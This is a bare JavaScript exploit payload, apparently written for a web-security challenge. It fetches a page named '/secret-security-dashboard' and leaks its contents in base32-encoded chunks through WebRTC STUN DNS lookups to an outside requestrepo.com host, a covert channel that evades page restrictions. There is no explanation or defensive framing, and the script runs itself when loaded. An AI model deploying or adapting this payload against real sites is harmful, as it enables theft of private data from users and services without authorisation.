function base32(s) {
  let b = "";
  for (let i = 0; i < s.length; i++) {
    b += s.charCodeAt(i).toString(2).padStart(8, "0");
  }
  let a = "abcdefghijklmnopqrstuvwxyz234567";
  let r = "";
  for (let i = 0; i < b.length; i += 5) {
    let p = b.substr(i, 5).padEnd(5, "0");
    let j = parseInt(p, 2);
    r += a.charAt(j);
  }
  return r.match(/.{1,63}/g).join(".");
}

async function leak(data) {
  let c = { iceServers: [{ urls: `stun:${base32(data)}.2q1widwk.requestrepo.com` }] };
  let p = new RTCPeerConnection(c);
  p.createDataChannel("");
  await p.setLocalDescription();
}

async function exploit() {
    try {
        let res = await fetch('/secret-security-dashboard');
        let text = await res.text();
        let l = text.length;
        // divide the data into 100 character chunks and leak them one by one
        for (let i = 0; i < l; i += 100) {
            leak(text.slice(i, i + 100));
        }
    } catch (e) {
        leak(e.message);
    }
}

exploit();
